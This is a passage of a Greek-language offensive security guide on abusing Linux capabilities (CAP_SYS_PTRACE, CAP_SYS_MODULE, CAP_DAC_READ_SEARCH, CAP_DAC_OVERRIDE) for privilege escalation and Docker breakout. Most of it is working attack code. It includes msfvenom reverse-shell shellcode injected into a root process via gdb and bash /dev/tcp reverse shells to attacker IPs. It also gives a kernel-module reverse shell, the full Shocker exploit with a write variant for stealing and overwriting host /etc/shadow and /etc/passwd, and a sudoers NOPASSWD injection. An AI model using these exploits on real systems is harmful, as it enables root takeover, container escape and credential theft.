Ένα capability σε έναν debugger αποτελεί μόνο ένα στοιχείο προς διερεύνηση. Ελέγξτε αν η τρέχουσα διεργασία μπορεί να εκτελέσει το συγκεκριμένο αρχείο (συμπεριλαμβανομένων των δικαιωμάτων ομάδας και ACL), αν το `CAP_SYS_PTRACE` είναι ενεργό μετά την εκτέλεση και αν ένας στόχος με υψηλότερα προνόμια είναι ορατός και μπορεί να γίνει attach στο ίδιο PID namespace. Τα `no_new_privs`, ένα mount με `nosuid`, το capability bounding set, τα Yama, seccomp ή ένα LSM μπορούν να επηρεάσουν το αποτέλεσμα. Δείτε τα [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) και την [τεκμηρίωση του Yama στον kernel](https://docs.kernel.org/admin-guide/LSM/Yama.html). Καταγράψτε τα μεταδεδομένα αρχείων και διεργασιών χωρίς να κάνετε attach σε κάποιον στόχο.

Δημιουργήστε shellcode με το msfvenom για έγχυση στη μνήμη μέσω gdb.

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Κάντε debug σε μια root διεργασία με gdb και κάντε copy-paste τις γραμμές gdb που δημιουργήθηκαν προηγουμένως:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Παράδειγμα με περιβάλλον (Docker breakout) - Another gdb Abuse**

Αν είναι εγκατεστημένο το **GDB** (ή μπορείτε να το εγκαταστήσετε, για παράδειγμα, με `apk add gdb` ή `apt install gdb`), μπορείτε να κάνετε **debug σε μια ορατή διεργασία του host** και να την κάνετε να καλέσει τη συνάρτηση `system`. Αυτό απαιτεί ενεργό `CAP_SYS_PTRACE` στο user namespace του στόχου και ορατότητα των PID του host· **δεν** απαιτεί `CAP_SYS_ADMIN`. Οι πολιτικές Yama, η κατάσταση non-dumpable, το seccomp και οι πολιτικές LSM μπορούν και πάλι να εμποδίσουν το attach.

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

Δεν θα μπορείς να δεις την έξοδο της εντολής που εκτελείται, αλλά αυτή θα εκτελεστεί από εκείνη τη διεργασία (οπότε πάρε ένα rev shell).

> [!WARNING]
> Αν εμφανιστεί το σφάλμα "No symbol "system" in current context.", έλεγξε το προηγούμενο παράδειγμα που φορτώνει ένα shellcode σε ένα πρόγραμμα μέσω gdb.

**Παράδειγμα με environment (Docker breakout) - Shellcode Injection**

Μπορείς να ελέγξεις τις ενεργοποιημένες capabilities μέσα στο docker container χρησιμοποιώντας:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

Λίστα με τις **διεργασίες** που εκτελούνται στο **host** `ps -eaf`

1. Βρείτε την **αρχιτεκτονική** `uname -m`
2. Βρείτε ένα **shellcode** για την αρχιτεκτονική ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Βρείτε ένα **πρόγραμμα** για να κάνετε **inject** το **shellcode** στη μνήμη μιας διεργασίας ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Τροποποιήστε** το **shellcode** μέσα στο πρόγραμμα και κάντε **compile** `gcc inject.c -o inject`
5. Κάντε **inject** και αποκτήστε το **shell** σας: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

Η δυνατότητα **[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** επιτρέπει σε μια διεργασία να **φορτώνει και να αφαιρεί kernel modules (system calls `init_module(2)`, `finit_module(2)` και `delete_module(2))`**, προσφέροντας άμεση πρόσβαση στις βασικές λειτουργίες του kernel. Αυτή η δυνατότητα ενέχει σοβαρούς κινδύνους για την ασφάλεια, επειδή η φόρτωση ενός module μπορεί να τροποποιήσει τη συμπεριφορά του kernel και ενδεχομένως να παρακάμψει όρια απομόνωσης.<sup>[[6]](#references)[[14]](#references)</sup>
Σε ένα συνηθισμένο rootful Linux container, αυτό αφορά τον **κοινόχρηστο kernel του host** και επομένως συνιστά άμεσο breakout. Η δυνατότητα πρέπει να είναι ενεργή στο αρχικό user namespace, επειδή η φόρτωση modules δεν περιορίζεται από namespaces. Ένα runtime με kernel σε userspace ή απομόνωση μέσω VM, όπως τα gVisor, Kata ή Hyper-V, αλλάζει το όριο του kernel στο οποίο είναι δυνατή η πρόσβαση. Η φόρτωση modules μπορεί και πάλι να αποκλειστεί από τα `modules_disabled`, kernel lockdown, επιβολή υπογραφών, seccomp ή ένα LSM.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Στο παρακάτω παράδειγμα, το binary **`python`** έχει αυτή τη δυνατότητα.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

Από προεπιλογή, η εντολή **`modprobe`** ελέγχει για αρχεία λίστας εξαρτήσεων και αντιστοίχισης στον κατάλογο **`/lib/modules/$(uname -r)`**.\
Για να το εκμεταλλευτούμε αυτό, ας δημιουργήσουμε έναν ψεύτικο φάκελο **lib/modules**:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Στη συνέχεια, **μεταγλωττίστε το kernel module που μπορείτε να βρείτε στα 2 παραδείγματα παρακάτω και αντιγράψτε** το σε αυτόν τον φάκελο:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Τέλος, εκτελέστε τον απαραίτητο κώδικα Python για να φορτώσετε αυτό το kernel module:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Παράδειγμα 2 με δυαδικό αρχείο**

Στο ακόλουθο παράδειγμα, το δυαδικό αρχείο **`kmod`** διαθέτει αυτή τη δυνατότητα.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Πράγμα που σημαίνει ότι μπορείτε να χρησιμοποιήσετε την εντολή **`insmod`** για να εισαγάγετε ένα kernel module. Ακολουθήστε το παρακάτω παράδειγμα για να αποκτήσετε ένα **reverse shell**, κάνοντας κατάχρηση αυτού του προνομίου.

**Παράδειγμα με περιβάλλον (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες δυνατότητες μέσα στο Docker container χρησιμοποιώντας:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Στην προηγούμενη έξοδο μπορείτε να δείτε ότι η δυνατότητα **SYS_MODULE** είναι ενεργοποιημένη.<sup>[[14]](#references)</sup>

**Δημιουργήστε** το **kernel module** που θα εκτελέσει ένα reverse shell και το **Makefile** για να το **μεταγλωττίσετε**:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Ο κενός χαρακτήρας πριν από κάθε λέξη make στο Makefile **πρέπει να είναι tab, όχι κενά**!

Εκτελέστε το `make` για να το μεταγλωττίσετε.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Τέλος, ξεκινήστε το nc μέσα σε ένα shell και **φορτώστε το module** από ένα άλλο, και θα συλλάβετε το shell στη διεργασία nc:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο «Abusing SYS_MODULE Capability» του** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Ένα άλλο παράδειγμα αυτής της τεχνικής μπορείτε να βρείτε στο [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

Η [**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει σε μια διεργασία να **παρακάμπτει τα δικαιώματα ανάγνωσης αρχείων, καθώς και ανάγνωσης και εκτέλεσης καταλόγων**. Εξουσιοδοτεί επίσης τη χρήση της `open_by_handle_at(2)`, η οποία ερμηνεύει ένα έγκυρο file handle σε σχέση με ένα file descriptor σημείου προσάρτησης για το ίδιο προσαρτημένο filesystem. Δεν εκθέτει αυτόματα κάθε αρχείο έξω από το mount namespace της διεργασίας. Για να γίνει breakout μέσω file handle, απαιτούνται επίσης μια αναφορά σε filesystem σχετική με το host, έγκυρα ή ανιχνεύσιμα handles, συμβατό filesystem και διάταξη αποθήκευσης, καθώς και να μην υπάρχει αποκλεισμός από το runtime ή το LSM. Η ιστορική τεχνική Docker «Shocker» έδειξε έναν τέτοιο συνδυασμό σε ευάλωτες διατάξεις, όπως αναλύεται [εδώ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**Αυτό σημαίνει ότι μπορείτε να παρακάμπτετε τους ελέγχους δικαιωμάτων ανάγνωσης αρχείων και τους ελέγχους δικαιωμάτων ανάγνωσης/εκτέλεσης καταλόγων**.<sup>[[14]](#references)</sup>

Για ένα **custom executable** που διαθέτει αυτή τη δυνατότητα, εξετάστε τι διαβάζει και τι επιστρέφει στον caller του. Ένα βοηθητικό πρόγραμμα σάρωσης αρχείων που δέχεται μια διαδρομή προστατευμένου αρχείου και ένα μήκος προθέματος που επιλέγει ο caller και στη συνέχεια αποκαλύπτει ένα πλήρες digest αυτού του προθέματος, μπορεί να λειτουργήσει ως file-read oracle: αφού ανακτήσετε τα πρώτα `n-1` bytes, συγκρίνετε τα πιθανά digests για κάθε επόμενο byte με το digest που επιστρέφει το βοηθητικό πρόγραμμα για μήκος `n`. Αυτό δεν εξαρτάται από την εύρεση κρυπτογραφικής σύγκρουσης ούτε ειδικά από το MD5· εξαρτάται από επαναλαμβανόμενα queries με επιλεγμένο μήκος και από ορατά, ντετερμινιστικά digests. Ένα digest ολόκληρου του αρχείου, χωρίς έλεγχο του προθέματος, δεν αποδεικνύει την ίδια δυνατότητα. Επιβεβαιώστε ότι ο caller μπορεί να εκτελέσει το βοηθητικό πρόγραμμα, ότι η δυνατότητα αρχείου του ενεργοποιείται, ότι η επιλεγμένη διαδρομή είναι προσβάσιμη στο mount namespace του και ότι η συμπεριφορά εισόδου/εξόδου όντως υπάρχει. Μην εκτελείτε ένα άγνωστο privileged helper μόνο και μόνο για να το δοκιμάσετε κατά την παθητική απαρίθμηση.

**Παράδειγμα με binary**

Το binary μπορεί να διαβάσει αρχεία που είναι προσβάσιμα στα namespaces του. Επομένως, αν ένα αρχείο όπως το `tar` διαθέτει αυτή τη δυνατότητα, μπορεί να διαβάσει το αρχείο shadow:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Παράδειγμα με binary2**

Σε αυτή την περίπτωση, ας υποθέσουμε ότι το binary **`python`** έχει αυτή τη δυνατότητα. Για να εμφανίσεις τα αρχεία του root, μπορείς να εκτελέσεις:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

Και για να διαβάσετε ένα αρχείο, μπορείτε να κάνετε:

```python
print(open("/etc/shadow", "r").read())
```

**Παράδειγμα στο περιβάλλον (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες capabilities μέσα στο Docker container χρησιμοποιώντας το `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Στο προηγούμενο αποτέλεσμα μπορείτε να δείτε ότι η δυνατότητα **DAC_READ_SEARCH** είναι ενεργοποιημένη. Παρακάμπτει τους ελέγχους ανάγνωσης/αναζήτησης DAC και επιτρέπει τη χρήση της `open_by_handle_at(2)`. Δεν είναι από μόνη της δυνατότητα εντοπισμού σφαλμάτων διεργασιών.<sup>[[14]](#references)</sup>

Μπορείτε να μάθετε πώς λειτουργεί το παρακάτω exploit στο [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), αλλά συνοπτικά, το **CAP_DAC_READ_SEARCH** επιτρέπει την περιήγηση στο σύστημα αρχείων χωρίς ελέγχους δικαιωμάτων και τη χρήση της `open_by_handle_at(2)`. Αυτό μπορεί να εκθέσει αρχεία που έχουν ανοίξει άλλες διεργασίες, όταν είναι προσβάσιμα τα σχετικά namespaces και mounts.<sup>[[13]](#references)[[14]](#references)</sup>

Το αρχικό exploit που καταχράται αυτά τα δικαιώματα για να διαβάσει αρχεία από το host βρίσκεται εδώ: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)· ακολουθεί μια **τροποποιημένη έκδοση που σας επιτρέπει να περάσετε ως πρώτο όρισμα το αρχείο προς ανάγνωση και να αποθηκεύσετε το αποτέλεσμα σε αρχείο**.<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> Το exploit πρέπει να βρει έναν δείκτη προς κάτι που είναι προσαρτημένο στο host. Το αρχικό exploit χρησιμοποιούσε το αρχείο /.dockerinit, ενώ αυτή η τροποποιημένη έκδοση χρησιμοποιεί το /etc/hostname. Αν το exploit δεν λειτουργεί, ίσως χρειάζεται να ορίσετε διαφορετικό αρχείο. Για να βρείτε ένα αρχείο που είναι προσαρτημένο στο host, εκτελέστε την εντολή mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: Το exploit πρέπει να βρει έναν δείκτη προς κάτι που είναι προσαρτημένο στο host. Το αρχικό exploit χρησιμοποιούσε το αρχείο /.dockerinit, ενώ αυτή η τροποποιημένη έκδοση χρησιμοποιεί...](<../../images/image (407) (1).png>)

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing DAC_READ_SEARCH Capability" του** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Αυτή η capability παρακάμπτει τους ελέγχους δικαιωμάτων ανάγνωσης και εγγραφής αρχείων και τους περισσότερους ελέγχους εκτέλεσης**· για την εκτέλεση ενός κανονικού αρχείου εξακολουθεί να απαιτείται να είναι ορισμένο τουλάχιστον ένα bit εκτέλεσης. Δεν παρακάμπτει ένα mount μόνο για ανάγνωση, την κατάσταση immutable ή μια άρνηση από LSM.<sup>[[14]](#references)</sup>

Αναζητήστε αρχεία που γίνονται αναγνώσιμα ή εγγράψιμα μέσω συμμετοχής σε μια προνομιούχα ομάδα· οι χρήσιμοι στόχοι εξαρτώνται από τον ιδιοκτήτη και τα mode bits του στόχου.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Σε αυτό το παράδειγμα, το vim έχει αυτή την capability, επομένως μπορείτε να τροποποιήσετε οποιοδήποτε αρχείο, όπως τα _passwd_, _sudoers_ ή _shadow_:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Παράδειγμα με δυαδικό αρχείο 2**

Σε αυτό το παράδειγμα, το δυαδικό αρχείο **`python`** θα έχει αυτήν τη δυνατότητα. Μπορείτε να χρησιμοποιήσετε το python για να αντικαταστήσετε οποιοδήποτε αρχείο:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Παράδειγμα με environment + CAP_DAC_READ_SEARCH (Docker breakout)**

`CAP_DAC_READ_SEARCH` επιτρέπει το `open_by_handle_at(2)`, αλλά **δεν** παρακάμπτει τους ελέγχους δικαιωμάτων εγγραφής. Η εγγραφή μέσω ενός επιλυμένου handle απαιτεί επίσης δικαίωμα εγγραφής για το effective filesystem UID/GID της διεργασίας ή μέσω ACL, ή `CAP_DAC_OVERRIDE`. Η αναφορά filesystem που αφορά το host, τα υποστηριζόμενα file handles, ένα writable mount και η πολιτική runtime/LSM πρέπει επίσης να επιτρέπουν τη λειτουργία. Ελέγξτε τα effective capabilities και την ταυτότητα· καμία από τις δύο capabilities από μόνη της δεν αποδεικνύει ότι υπάρχει writable στόχος στο host. Δείτε τα [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) και [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html).<sup>[[14]](#references)[[26]](#references)</sup>

Αρχικά, διαβάστε την προηγούμενη ενότητα που [**καταχράται την capability DAC_READ_SEARCH για την ανάγνωση αυθαίρετων αρχείων**](linux-capabilities.md#cap_dac_read_search) του host και **κάντε compile** το exploit.\
Το ακόλουθο ιστορικό δείγμα επιχειρεί να ανοίξει ένα επιλυμένο αρχείο με `O_RDWR`· επιτυγχάνει μόνο όταν ισχύουν οι παραπάνω προϋποθέσεις για το filesystem και τα δικαιώματα εγγραφής:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Για να κάνεις escape από το docker container, μπορείς να **κατεβάσεις** τα αρχεία `/etc/shadow` και `/etc/passwd` από το host, να **προσθέσεις** σε αυτά έναν **νέο χρήστη** και να χρησιμοποιήσεις το **`shocker_write`** για να τα αντικαταστήσεις. Στη συνέχεια, **συνδέσου** μέσω **ssh**.

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο «Abusing DAC_OVERRIDE Capability» του** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

